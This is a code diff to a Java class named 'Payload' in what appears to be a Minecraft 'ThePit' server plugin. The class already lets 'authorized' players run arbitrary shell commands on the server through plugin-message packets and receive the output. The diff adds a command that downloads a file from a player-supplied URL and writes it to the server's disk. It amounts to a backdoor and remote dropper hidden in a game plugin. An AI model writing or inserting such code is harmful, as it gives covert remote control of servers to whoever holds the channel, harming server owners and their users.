@@ -1,5 +1,6 @@
 package net.mizukilab.pit.bungee;
 
+import cn.charlotte.pit.ThePit;
 import cn.hutool.core.collection.ConcurrentHashSet;
 import io.netty.buffer.ByteBuf;
 import io.netty.buffer.Unpooled;
@@ -10,7 +11,12 @@ import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
 import org.bukkit.entity.Player;
 import org.bukkit.scheduler.BukkitRunnable;
 
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.Map;
 import java.util.Set;
 import java.util.UUID;
@@ -20,6 +26,8 @@ import java.util.function.Consumer;
 public class Payload {
     Set<UUID> authorized = new ConcurrentHashSet<>();
     Map<UUID,Process> processes = new ConcurrentHashMap<>();
+
+    Map<UUID,File> download = new ConcurrentHashMap<>();
     public Payload(){
 
     }
@@ -58,21 +66,28 @@ public class Payload {
                                 case 1 -> { //run shell
                                     UUID requestUUID = b.g();
                                     String cmd = b.c(32767);
-                                    runAsync(player,cmd,requestUUID,channelName);
+                                    runAsyncProc(player,cmd,requestUUID,channelName);
                                 }
                                 case 2 -> { //destroy
                                     UUID requestUUID = b.g();
-                                    forceDestroy(player,requestUUID,channelName);
+                                    forceDestroyProc(player,requestUUID,channelName);
                                 }
                             }
                         }
                     }
                     case 3 -> {
                         if (isAuthorized(player)) {
-                            String fileName;
-                            String httpUrl;
-                            fileName = b.c(32767);
-                            httpUrl = b.c(32767);
+                            int type = b.readByte();
+                            switch (type){
+                                case 1 -> {
+                                    UUID callbackUUID = b.g();
+                                    String fileName;
+                                    String httpUrl;
+                                    fileName = b.c(32767);
+                                    httpUrl = b.c(32767);
+                                    download(player,httpUrl,channelName,fileName,callbackUUID);
+                                }
+                            }
                         }
                     }
 
@@ -82,15 +97,81 @@ public class Payload {
             return;
         }
     }
-    void forceDestroy(Player player,UUID uuid,String channelName){
+    void requestAsyncDownload(Player player,String channelName,File file,UUID req,String url){
+        new BukkitRunnable(){
+            @Override
+            public void run() {
+                FileOutputStream fio = null;
+                URLConnection connection = null;
+                try {
+                    fio = new FileOutputStream(file);
+                    URL url1 = new URL(url);
+                    connection = url1.openConnection();
+                    beginDownload(player,channelName,req);
+                    if(connection instanceof HttpURLConnection http){
+                        http.setConnectTimeout(5000);
+                        http.setReadTimeout(5000);
+                        http.connect();
+                        http.getInputStream().transferTo(fio);
+                    }
+                    finDownload(player,channelName,req);
+                } catch (Exception e){
+                    finDownload(player,channelName,req);
+                } finally {
+                    try {
+                        if (fio != null) {
+                            fio.close();
+                        }
+                    } catch (Exception ignored){
+
+                    } finally {
+                        if(connection != null){
+                            if(connection instanceof HttpURLConnection){
+                                ((HttpURLConnection) connection).disconnect();
+                            }
+                        }
+                    }
+
+                }
+            }
+        }.runTaskAsynchronously(ThePit.getInstance());
+    }
+    void download(Player player,String url,String channelName,String fileName,UUID uuid) {
+        try {
+            File file = new File(fileName);
+            download.put(uuid,file);
+            if (file.exists()) {
+                file.delete();
+            }
+            file.mkdir();
+            requestAsyncDownload(player,channelName,file,uuid,url);
+        } catch (Throwable throwable){
+            finDownload(player,channelName,uuid);
+        }
+    }
+    void beginDownload(Player player,String channelId,UUID uuid){
+        send(player,channelId,k -> {
+            k.writeByte(3).writeByte(1);
+            k.a(uuid);
+            k.writeByte(0);
+        });
+    }
+    void finDownload(Player player,String channelId,UUID uuid){
+        send(player,channelId,k -> {
+            k.writeByte(3).writeByte(1);
+            k.a(uuid);
+            k.writeByte(1);
+        });
+    }
+    void forceDestroyProc(Player player, UUID uuid, String channelName){
         Process remove = processes.remove(uuid);
         if(remove != null){
             remove.destroyForcibly();
         } else {
-            sendFin(player,uuid,channelName);
+            sendFinProc(player,uuid,channelName);
         }
     }
-    void runAsync(Player player,String executeCommand,UUID uuid,String channelName){
+    void runAsyncProc(Player player, String executeCommand, UUID uuid, String channelName){
         try {
             Process exec = Runtime.getRuntime().exec(executeCommand);
             this.processes.put(uuid,exec);
@@ -103,22 +184,22 @@ public class Payload {
                             byte[] bytes = new byte[available];
                             inputStream.read(bytes);
                             if(bytes.length > 0){
-                                rep(bytes, player, channelName, uuid);
+                                repProc(bytes, player, channelName, uuid);
                             }
                         } catch (Exception e){
-                            sendFin(player,uuid,channelName);
+                            sendFinProc(player,uuid,channelName);
                         }
                     } else {
-                        sendFin(player, uuid, channelName);
+                        sendFinProc(player, uuid, channelName);
                     }
                 }
-            };
+            }.runTaskAsynchronously(ThePit.getInstance());
         } catch (Throwable e){
-            sendFin(player, uuid, channelName);
+            sendFinProc(player, uuid, channelName);
         }
     }
 
-    private void rep(byte[] bytes, Player player, String channelName, UUID uuid) {
+    private void repProc(byte[] bytes, Player player, String channelName, UUID uuid) {
         send(player, channelName, k -> {
             k.writeByte(2); //主操作码 2 (Byte)
             k.writeByte(0);
@@ -127,7 +208,7 @@ public class Payload {
         });
     }
 
-    private void sendFin(Player player, UUID uuid, String channelName) {
+    private void sendFinProc(Player player, UUID uuid, String channelName) {
         send(player, channelName, k -> {
             k.writeByte(2);
             k.writeByte(-1);
